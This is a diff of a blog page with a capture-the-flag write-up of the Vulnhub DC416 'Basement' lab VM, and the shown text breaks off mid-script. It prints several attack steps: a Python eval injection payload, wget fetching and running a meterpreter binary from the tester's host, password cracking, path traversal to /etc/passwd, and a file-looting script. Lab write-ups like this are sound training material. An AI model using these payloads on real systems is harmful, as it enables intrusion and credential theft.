@@ -1,67 +1,71 @@
 <!doctype html>
 <html lang="en" prefix="og: http://ogp.me/ns#">
+
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vulnhub - DC416: Basement Writeup</title>
-    <meta name="description" content="Vulnhub - DC416: Basement Writeup">
-    
-    <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, basement">
-    
-    <meta name="author" content="Christian Mehlmauer">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vulnhub - DC416: Basement Writeup</title>
+  <meta name="description"
+    content="Vulnhub - DC416: Basement Writeup">
+  
+  <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, basement">
+  
+  <meta name="author" content="Christian Mehlmauer">
 
-    <meta name="twitter:card" content="summary">
-    
-    <meta name="twitter:site" content="@firefart" />
-    <meta name="twitter:creator" content="@firefart" />
-    
-    <meta name="twitter:title" content="Vulnhub - DC416: Basement Writeup">
-    <meta name="twitter:description" content="Vulnhub - DC416: Basement Writeup">
-    <meta property="og:title" content="Vulnhub - DC416: Basement Writeup">
-    <meta property="og:type" content="article">
-    <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_basement/" />
-    <meta property="og:description" content="Vulnhub - DC416: Basement Writeup">
-    
-    <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
-    <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
-    
-    <meta property="og:updated_time" content="2016-12-18 01:00:00 &#43;0100 CET"/>
-    <meta property="article:author" content="https://twitter.com/firefart"/>
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@firefart" />
+  <meta name="twitter:creator" content="@firefart" />
+  
+  <meta name="twitter:title" content="Vulnhub - DC416: Basement Writeup">
+  <meta name="twitter:description"
+    content="Vulnhub - DC416: Basement Writeup">
+  <meta property="og:title" content="Vulnhub - DC416: Basement Writeup">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_basement/" />
+  <meta property="og:description"
+    content="Vulnhub - DC416: Basement Writeup">
+  
+  <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
+  <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
+  
+  <meta property="og:updated_time" content="2016-12-18 01:00:00 &#43;0100 CET" />
+  <meta property="article:author" content="https://twitter.com/firefart" />
 
-    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet" type="text/css">
-    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
-    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
+  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet"
+    type="text/css">
+  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
+  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
 
-    <link rel="stylesheet" href='https://firefart.at/css/all.min.css'>
-    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="stylesheet" href='https://firefart.at/css/all.css'>
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
-    
-    
-    <script type="application/ld+json">
-    [
-      {
-        "@context" : "http://schema.org",
-        "@type" : "WebSite",
-        "name" : "FireFart",
-        "url" : "https://firefart.at"
+  
+  
+  <script type="application/ld+json">
+    [{
+        "@context": "http://schema.org",
+        "@type": "WebSite",
+        "name": "FireFart",
+        "url": "https://firefart.at"
       },
       {
-        "@context" : "http://schema.org",
-        "@type" : "Person",
-        "name" : "Christian Mehlmauer",
-        "url" : "https://firefart.at",
-        "sameAs" : [
+        "@context": "http://schema.org",
+        "@type": "Person",
+        "name": "Christian Mehlmauer",
+        "url": "https://firefart.at",
+        "sameAs": [
           "https://twitter.com/firefart",
           "https://github.com/FireFart",
           "https://www.facebook.com/christian.mehlmauer"
         ]
       }
     ]
-    </script>
+  </script>
 
 </head>
-<body>
 
+<body>
 
 <div id="layout" class="pure-g">
     <div class="sidebar pure-u-1 pure-u-md-1-4">
@@ -80,7 +84,7 @@
                 
                 
                 <li class="nav-item">
-                     <a class="pure-button" target="_blank" href="https://github.com/FireFart">
+                    <a class="pure-button" target="_blank" href="https://github.com/FireFart">
                         <i class="fa fa-github-alt"></i> Github
                     </a>
                 </li>
@@ -100,7 +104,6 @@
     </div>
 </div>
 
-
     <div class="content pure-u-1 pure-u-md-3-4">
         <div>
             
@@ -118,35 +121,20 @@
                     </header>
 
                     <div id="toc" class="well col-md-4 col-sm-6">
-                      <nav id="TableOfContents">
-<ul>
-<li><a href="#information-gathering">information gathering</a></li>
-<li><a href="#jack">jack</a></li>
-<li><a href="#marla-1">marla #1</a></li>
-<li><a href="#marla-2">marla #2</a></li>
-<li><a href="#tyler">tyler</a></li>
-<li><a href="#robert">robert</a></li>
-</ul>
-</nav>
+                        <nav id="TableOfContents"></nav>
                     </div>
 
                     <div class="post-description">
-                      <p>Basement is the first of 4 VMs from the DC416 CTF by <a href="https://twitter.com/barrebas">@barrebas</a> on <a href="https://www.vulnhub.com/entry/dc416-2016,168/">Vulnhub</a>. There are 5 flags on this machine but I was only able to get 4 of them.</p>
-
+                        <p>Basement is the first of 4 VMs from the DC416 CTF by <a href="https://twitter.com/barrebas">@barrebas</a> on <a href="https://www.vulnhub.com/entry/dc416-2016,168/">Vulnhub</a>. There are 5 flags on this machine but I was only able to get 4 of them.</p>
 <p>Here are my other writeups for the DC416 challenges:</p>
-
 <ul>
 <li><a href="/post/vulnhub_dc416_baffle/">DC416 Baffle</a></li>
 <li><a href="/post/vulnhub_dc416_dick_dastardly/">DC416 Dick Dastardly</a></li>
 <li><a href="/post/vulnhub_dc416_fortress/">DC416 Fortress</a></li>
 </ul>
-
 <h1 id="information-gathering">information gathering</h1>
-
 <p>Before you start with a portscan you need to wait a few minutes because there are several binaries executed by cronjobs. I noticed this during exploiting the machine so be sure to start nmapping after the machine runs a few minutes.</p>
-
 <p>Nmap Scan:</p>
-
 <pre><code>Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-17 22:15 CET
 Nmap scan report for 192.168.56.101
 Host is up (0.00024s latency).
@@ -181,71 +169,44 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds
-</code></pre>
-
-<h1 id="jack">jack</h1>
-
+</code></pre><h1 id="jack">jack</h1>
 <p>So let&rsquo;s start with the service on port 10000. The script asks the user to enter a number of packets to send and executes a ping:</p>
-
 <pre><code>root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: 1
 
 PING localhost (127.0.0.1) 56(84) bytes of data
 64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.053 ms
-</code></pre>
-
-<p>When entering something different we can see there is a python script which takes user input through the <code>input</code> method.</p>
-
+</code></pre><p>When entering something different we can see there is a python script which takes user input through the <code>input</code> method.</p>
 <pre><code>root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: help
 Traceback (most recent call last):
   File &quot;./ping.py&quot;, line 3, in &lt;module&gt;
     num_packets = int(input(' Please enther number of packets: '))
 TypeError: int() argument must be a string or a number, not '_Helper'
-</code></pre>
-
-<p>In python 2 the <code>ìnput</code> method is the same as <code>eval(raw_input())</code> so it&rsquo;s possible to evaluate python statements (In python 3 <code>input</code> behaves the same as <code>raw_input</code>).</p>
-
+</code></pre><p>In python 2 the <code>ìnput</code> method is the same as <code>eval(raw_input())</code> so it&rsquo;s possible to evaluate python statements (In python 3 <code>input</code> behaves the same as <code>raw_input</code>).</p>
 <p>So by trying the payload <code>__import__('os').system('id')</code> we can see the user running this script:</p>
-
 <pre><code>root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: __import__('os').system('id')
 uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
 
 PING localhost (127.0.0.1) 56(84) bytes of data
-</code></pre>
-
-<p>So the next step is to download a meterpreter binary and execute it with the following set of commands:</p>
-
+</code></pre><p>So the next step is to download a meterpreter binary and execute it with the following set of commands:</p>
 <pre><code>echo &quot;__import__('os').system('wget -O /tmp/meterpreter http://192.168.56.3/meterpreter')&quot; | nc 192.168.56.101 10000
 echo &quot;__import__('os').system('chmod +x /tmp/meterpreter')&quot; | nc 192.168.56.101 10000
 echo &quot;__import__('os').system('/tmp/meterpreter &amp;')&quot; | nc 192.168.56.101 10000
-</code></pre>
-
-<p>Using the meterpreter session we are able to get the first flag:</p>
-
+</code></pre><p>Using the meterpreter session we are able to get the first flag:</p>
 <pre><code>meterpreter &gt; cat flag.txt
 flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
-</code></pre>
-
-<h1 id="marla-1">marla #1</h1>
-
+</code></pre><h1 id="marla-1">marla #1</h1>
 <p>By looking at <code>/etc/passwd</code> we can see there are 4 seperate users on the system so probably each user holds one flag.</p>
-
 <pre><code>jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
 marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
 tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
 robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
-</code></pre>
-
-<p>In the folder <code>/home/jack/.secret/</code> there is a file called <code>marla.xip</code>. A file command on the file reveals only <code>data</code> so we have to dig deeper.</p>
-
+</code></pre><p>In the folder <code>/home/jack/.secret/</code> there is a file called <code>marla.xip</code>. A file command on the file reveals only <code>data</code> so we have to dig deeper.</p>
 <pre><code>root@kali:~# file marla.xip
 marla.xip: data
-</code></pre>
-
-<p>barrebas got me the hint that this <code>xip</code> extension is a mix of two filetypes. So the file is probably a XOR encrypted ZIP archive. To quickly test XOR keys I used <a href="https://github.com/hellman/xortool.git">xortool</a>.</p>
-
+</code></pre><p>barrebas got me the hint that this <code>xip</code> extension is a mix of two filetypes. So the file is probably a XOR encrypted ZIP archive. To quickly test XOR keys I used <a href="https://github.com/hellman/xortool.git">xortool</a>.</p>
 <pre><code>root@kali:~/xortool# xortool -b /root/marla.xip
 The most probable key lengths:
    3:   14.6%
@@ -268,10 +229,7 @@ I0]L7I
 ...
 Found 0 plaintexts with 95.0%+ printable characters
 See files filename-key.csv, filename-char_used-perc_printable.csv
-</code></pre>
-
-<p>Now let&rsquo;s look at the directory with the decoded files and see if we can spot something of interest:</p>
-
+</code></pre><p>Now let&rsquo;s look at the directory with the decoded files and see if we can spot something of interest:</p>
 <pre><code>root@kali:~/xortool/xortool_out# file * | grep -v &quot;     data&quot;
 000.out:                               Zip archive data
 197.out:                               PGP\011Secret Key -
@@ -281,12 +239,8 @@ See files filename-key.csv, filename-char_used-perc_printable.csv
 252.out:                               AIX core file fulldump
 filename-char_used-perc_printable.csv: ASCII text
 filename-key.csv:                      ASCII text
-</code></pre>
-
-<p>So we have found a ZIP archive. By looking at the generated csv we can see the XOR key beeing used was <code>M4YH3M</code>.</p>
-
+</code></pre><p>So we have found a ZIP archive. By looking at the generated csv we can see the XOR key beeing used was <code>M4YH3M</code>.</p>
 <p>Next step is to examine the contents of the zip file.</p>
-
 <pre><code>root@kali:~# mv 000.out /root/marla.zip
 root@kali:~# unzip -l marla.zip
 Archive:  marla.zip
@@ -296,12 +250,8 @@ Archive:  marla.zip
       396  2016-11-22 04:49   marla.pub
 ---------                     -------
      2162                     2 files
-</code></pre>
-
-<p>Unfortunately the zip file is encrypted with a password so let&rsquo;s try to crack it.</p>
-
+</code></pre><p>Unfortunately the zip file is encrypted with a password so let&rsquo;s try to crack it.</p>
 <p>JohnTheRipper contains a handy little script called <code>zip2john</code> to extract the password hash for cracking. I then removed all except the hash from the file and ran hashcat against it.</p>
-
 <pre><code>[firefart@linux hashcat]$ /home/firefart/hacking/JohnTheRipper/run/zip2john /home/firefart/marla.zip
 marla.zip:$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:::::marla.zip
 
@@ -331,12 +281,8 @@ HWMon.Dev.#1.....: Temp: 73c Fan: 56% Util: 95% Core:1911Mhz Mem:3802Mhz Lanes:1
 
 Started: Thu Jan 19 16:33:16 2017
 Stopped: Thu Jan 19 16:34:21 2017
-</code></pre>
-
-<p>Awesome so the password is <code>m4rl4</code>.</p>
-
+</code></pre><p>Awesome so the password is <code>m4rl4</code>.</p>
 <p>We are now able to extract the zip file with <code>p7zip</code>.</p>
-
 <pre><code>root@kali:~# p7zip -d marla.7z
 
 7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
@@ -365,10 +311,7 @@ Archives with Warnings: 1
 Files: 2
 Size:       2162
 Compressed: 1974
-</code></pre>
-
-<p>So let&rsquo;s have a look at the extracted files:</p>
-
+</code></pre><p>So let&rsquo;s have a look at the extracted files:</p>
 <pre><code>
 root@kali:~# cat marla.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuh1NziT0vauHjqRvPIDQnFKYYtaYP1h56DXesZ6ZlSezFZVtJ1oQvLh3WJGgH7Bojzwxo4k5xwvw/0fyvCD68GGA99j8wfcYvFQ60BGMUYHfEduQPs0sAmL9tftIUY1vLf6htgCfz8oJ6Pi9YxLkgrS0+udGGxU0rXkU6hfaT710VH2DpvxymXbrKHHnd2wYmf/VVg54ugRyKWjKSBR+IkXTJr0FSMmsb7s1O84r1XTjJUJc6AZkiN1NLMxDQ1xnb/ToCnSpPIDm83fPDLDYhnlNZ2YoVqq9TTYVF9lxBaYLEjhVI+HKFF2geWjnMR5IHU/YwKWodcqh2GYY/LGNV marla@basement
@@ -405,12 +348,8 @@ x6nP22au0LGKTj4+E46r1hEWs9C0X8AMJjfShb+CyN/imo/3a3bJiazE1F5IpKlY
 kTNSGJSOrF5el9+wlpLY4E8loocJpzH3P3uu+fOwHtNiul5RAlotfJnJd9lYea5k
 W581cgXIWgN6actoiIGZXlHKB5Zsdb3GdmmG0Lb50lsL4GH8MIKDKdumUKSwrT20
 -----END RSA PRIVATE KEY-----
-</code></pre>
-
-<p>Crap, another encrypted key. But we can see clearly this two files are SSH keys used for connecting as <code>marla</code> to the machine using SSH.</p>
-
+</code></pre><p>Crap, another encrypted key. But we can see clearly this two files are SSH keys used for connecting as <code>marla</code> to the machine using SSH.</p>
 <p>Again, JohnTheRipper has a script ready for us: <code>sshng2john.py</code></p>
-
 <pre><code>[firefart@linux run]$ /home/firefart/hacking/JohnTheRipper/run/sshng2john.py /home/firefart/marla.key &gt; /home/firefart/marla
 [firefart@linux run]$ ./john /home/firefart/marla.key
 Using default input encoding: UTF-8
@@ -424,12 +363,8 @@ finding a possible candidate.
 Press 'q' or Ctrl-C to abort, almost any other key for status
 singer           (/home/firefart/marla.key)
 singer           (/home/firefart/marla.key)
-</code></pre>
-
-<p>Jeah so the key password is <code>singer</code>.</p>
-
+</code></pre><p>Jeah so the key password is <code>singer</code>.</p>
 <p>We can now use this password to retreive the next flag:</p>
-
 <pre><code>root@kali:~# ssh -i marla marla@192.168.56.101
 The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
 ECDSA key fingerprint is SHA256:CGwzPRVhg2hHuFrgbZjV6MHx+xXtDLYXCzQJO3PrH4U.
@@ -445,59 +380,34 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 well done! your flag is flag{l4y3rs_up0n_l4y3rs}
 Connection to 192.168.56.101 closed.
-</code></pre>
-
-<h1 id="marla-2">marla #2</h1>
-
+</code></pre><h1 id="marla-2">marla #2</h1>
 <p>By looking at the running processes there seems to be an audio stream of a flag streamed by <code>marla</code> and a binary only accepting connections from localhost run by <code>robert</code>.</p>
-
 <pre><code>marla     3785  4.5  6.2 464280 31612 ?        S    02:10   0:06 ffserver -f /home/marla/ffserver.conf
 marla     3787 94.4  6.3 462656 32204 ?        R    02:10   2:10 ffmpeg -stream_loop -1 -f wav -i /home/marla/flag.wav http://127.0.0.1:8090/feed1.ffm
 robert    3782  0.0  0.5  19644  2808 ?        S    02:10   0:00 socat TCP-LISTEN:10001,reuseaddr,fork,range=127.0.0.1/32 EXEC:./tenbytes,pty,stderr,echo=0
-</code></pre>
-
-<p>First we try the streaming webserver:</p>
-
+</code></pre><p>First we try the streaming webserver:</p>
 <pre><code>$ nc 127.0.0.1 8090
 GET / HTTP/1.0
 
 HTTP/1.0 301 Moved
 Location: http://localhost/flag.mpg
 Content-type: text/html
-</code></pre>
-
-<p>So we need to get a file called <code>flag.mpg</code>. As this file is streamed endlessly we need to kill the download after a while as it will never end.</p>
-
+</code></pre><p>So we need to get a file called <code>flag.mpg</code>. As this file is streamed endlessly we need to kill the download after a while as it will never end.</p>
 <pre><code>wget http://127.0.0.1:8090/flag.mpg
-</code></pre>
-
-<p>By downloading the mpg and listening to it locally, we can hear a computer generated voice saying the following numbers:</p>
-
+</code></pre><p>By downloading the mpg and listening to it locally, we can hear a computer generated voice saying the following numbers:</p>
 <pre><code>102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125
-</code></pre>
-
-<p>By decoding the numbers as ascii, we get the second flag <code>flag{bR4in_paRas1te$}</code></p>
-
+</code></pre><p>By decoding the numbers as ascii, we get the second flag <code>flag{bR4in_paRas1te$}</code></p>
 <pre><code>a = &quot;102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125&quot;
 b = &quot;&quot;
 for x in a.split(&quot; &quot;):
 	b += chr(int(x))
 print(b)
-</code></pre>
-
-<h1 id="tyler">tyler</h1>
-
+</code></pre><h1 id="tyler">tyler</h1>
 <p>When connecting to the webserver on port 8080 the following server header is returned</p>
-
 <pre><code>------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
-</code></pre>
-
-<p>This string is definitely <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>. Using an <a href="https://copy.sh/brainfuck/">online decoder</a> we can see the string translates back to <code>webf</code>.</p>
-
+</code></pre><p>This string is definitely <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>. Using an <a href="https://copy.sh/brainfuck/">online decoder</a> we can see the string translates back to <code>webf</code>.</p>
 <p>When trying to access files in the webroot the webserver crashes and only comes up again after some time (probably by a cron job).</p>
-
 <p>All error messages are also translated to Brainfuck:</p>
-
 <pre><code>root@kali:~# nc 192.168.56.101 8080
 webf
 HTTP/1.1 501 Not Implemented
@@ -507,18 +417,11 @@ Content-type: text/html
 501: Not Implemented
 &lt;p&gt;+[-------&gt;++&lt;]&gt;.+.+++++.[----&gt;+&lt;]&gt;+++.++[-&gt;+++&lt;]&gt;.+++++++++.++++++.-------.----------.: webf
 &lt;hr&gt;&lt;em&gt;------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.&lt;/em&gt;
-</code></pre>
-
-<p>By looking at the process list again the binary running seems to be <code>tiny</code>:</p>
-
+</code></pre><p>By looking at the process list again the binary running seems to be <code>tiny</code>:</p>
 <pre><code>14709  1      run_tiny.sh              0        tyler     /bin/bash /home/tyler/run_tiny.sh
 14711  14709  tiny                     0        tyler     /home/tyler/tiny 8080
-</code></pre>
-
-<p>By asking our friend google this seems to be the <a href="https://github.com/shenfeng/tiny-web-server">tiny-web-server</a>. This webserver behaves as pythons <code>SimpleHTTPServer</code> and serves the whole directory from where it is run. By looking at the issues page there seems to be an unpatched arbitrary file read vulnerability <a href="https://github.com/shenfeng/tiny-web-server/issues/2">https://github.com/shenfeng/tiny-web-server/issues/2</a>.</p>
-
+</code></pre><p>By asking our friend google this seems to be the <a href="https://github.com/shenfeng/tiny-web-server">tiny-web-server</a>. This webserver behaves as pythons <code>SimpleHTTPServer</code> and serves the whole directory from where it is run. By looking at the issues page there seems to be an unpatched arbitrary file read vulnerability <a href="https://github.com/shenfeng/tiny-web-server/issues/2">https://github.com/shenfeng/tiny-web-server/issues/2</a>.</p>
 <p>Our webserver crashes when requesting files normally so let&rsquo;s try to request <code>../../../../../../../etc/passwd</code> encoded in Brainfuck</p>
-
 <pre><code>root@kali:~# nc 192.168.56.101 8080
 GET ++[------&gt;+&lt;]&gt;+++..+.-..+.-..+.-..+.-..+.-..+.-..+.[---&gt;+&lt;]&gt;.[---&gt;+&lt;]&gt;---.++[-&gt;+++&lt;]&gt;+.-[--&gt;+&lt;]&gt;--.+[-----&gt;+&lt;]&gt;.[-----&gt;++&lt;]&gt;+.--[---&gt;+&lt;]&gt;--..++++.[-&gt;+++&lt;]&gt;-. HTTP/1.0
 
@@ -554,84 +457,76 @@ marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
 tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
 robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
 sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
-</code></pre>
-
-<p>Bingo!</p>
-
+</code></pre><p>Bingo!</p>
 <p>So we are able to read files as <code>tyler</code> but we already looked around on the server as <code>jack</code> so we are interested in the files in tyler&rsquo;s home directory. We can not use tools like dirbuster because it crashes the server so my solution was to come up with a simple python script to encode all wordlist entries to Brainfuck, request the file and save it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 
-<pre><code class="language-python">#!/usr/bin/env python3
+<span style="color:#f92672">import</span> http.client
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
 
-import http.client
-from time import sleep
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sf</span>(filename, data):
+    <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+        f<span style="color:#f92672">.</span>write(data)
 
-def sf(filename, data):
-    with open(filename, 'wb') as f:
-        f.write(data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rf</span>(filename):
+    <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#39;rt&#39;</span>) <span style="color:#66d9ef">as</span> f:
+        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span>readlines()
 
-def rf(filename):
-    with open(filename, 'rt') as f:
-        return f.readlines()
+wordlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/share/wordlists/dirb/common.txt&#34;</span>
 
-wordlist = &quot;/usr/share/wordlists/dirb/common.txt&quot;
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">char2bf</span>(char):
+    result_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    ascii_value <span style="color:#f92672">=</span> ord(char)
+    factor <span style="color:#f92672">=</span> ascii_value <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>
+    remaining <span style="color:#f92672">=</span> ascii_value <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;{}&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;[&#34;</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&gt;&#34;</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;{}&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> int(factor))
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;&#34;</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;-&#34;</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;]&#34;</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&gt;&#34;</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;{}&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> remaining)
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;.&#34;</span>
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;[-]&#34;</span>
+    <span style="color:#66d9ef">return</span> result_code
 
-def char2bf(char):
-    result_code = &quot;&quot;
-    ascii_value = ord(char)
-    factor = ascii_value / 10
-    remaining = ascii_value % 10
-    result_code += &quot;{}&quot;.format(&quot;+&quot; * 10)
-    result_code += &quot;[&quot;
-    result_code += &quot;&gt;&quot;
-    result_code += &quot;{}&quot;.format(&quot;+&quot; * int(factor))
-    result_code += &quot;&lt;&quot;
-    result_code += &quot;-&quot;
-    result_code += &quot;]&quot;
-    result_code += &quot;&gt;&quot;
-    result_code += &quot;{}&quot;.format(&quot;+&quot; * remaining)
-    result_code += &quot;.&quot;
-    result_code += &quot;[-]&quot;
-    return result_code
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">str2bf</span>(string):
+    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> string:
+        result <span style="color:#f92672">+=</span> char2bf(char)
+    <span style="color:#66d9ef">return</span> result
 
-def str2bf(string):
-    result = &quot;&quot;
-    for char in string:
-        result += char2bf(char)
-    return result
+words <span style="color:#f92672">=</span> rf(wordlist)
+counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 
-words = rf(wordlist)
-counter = 1
+<span style="color:#75715e">#  words = [&#39;.ssh/id_rsa&#39;]</span>
 
-#  words = ['.ssh/id_rsa']
-
-for w in words:
-    w = w.strip()
-    filename = str2bf(w)
-    try:
-        conn = http.client.HTTPConnection(&quot;192.168.56.101&quot;, 8080)
-        conn.request(&quot;GET&quot;, filename)
-        resp = conn.getresponse()
-        data = resp.read().strip()
-        if b&quot;404: Not Found&quot; in data:
-            print(&quot;File {} not found&quot;.format(w))
-        else:
-            filename = &quot;{}_{}.loot&quot;.format(counter, w.replace(&quot;/&quot;, &quot;_&quot;))
+<span style="color:#66d9ef">for</span> w <span style="color:#f92672">in</span> words:
+    w <span style="color:#f92672">=</span> w<span style="color:#f92672">.</span>strip()
+    filename <span style="color:#f92672">=</span> str2bf(w)
+    <span style="color:#66d9ef">try</span>:
+        conn <span style="color:#f92672">=</span> http<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>HTTPConnection(<span style="color:#e6db74">&#34;192.168.56.101&#34;</span>, <span style="color:#ae81ff">8080</span>)
+        conn<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;GET&#34;</span>, filename)
+        resp <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>getresponse()
+        data <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;404: Not Found&#34;</span> <span style="color:#f92672">in</span> data:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;File {} not found&#34;</span><span style="color:#f92672">.</span>format(w))
+        <span style="color:#66d9ef">else</span>:
+            filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}_{}.loot&#34;</span><span style="color:#f92672">.</span>format(counter, w<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>))
             sf(filename, data)
-            print(&quot;File {} saved!!!!!!&quot;.format(w))
-    except http.client.IncompleteRead:
-        print(&quot;File {} returned an error (most likely it's a directory)&quot;.format(w))
-        print(&quot;This request crashed the webserver so let's wait a little ....&quot;)
-        sleep(30)
-    finally:
-        if conn:
-            conn.close()
-    counter += 1
-</code></pre>
-
-<p>By executing the script the server crashed at the <code>.ssh</code> entry so it must be an issue when requesting directories. But this also drove me in the right direction to try if there is an <code>.ssh/id_rsa</code> private key file present.</p>
-
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;File {} saved!!!!!!&#34;</span><span style="color:#f92672">.</span>format(w))
+    <span style="color:#66d9ef">except</span> http<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>IncompleteRead:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;File {} returned an error (most likely it&#39;s a directory)&#34;</span><span style="color:#f92672">.</span>format(w))
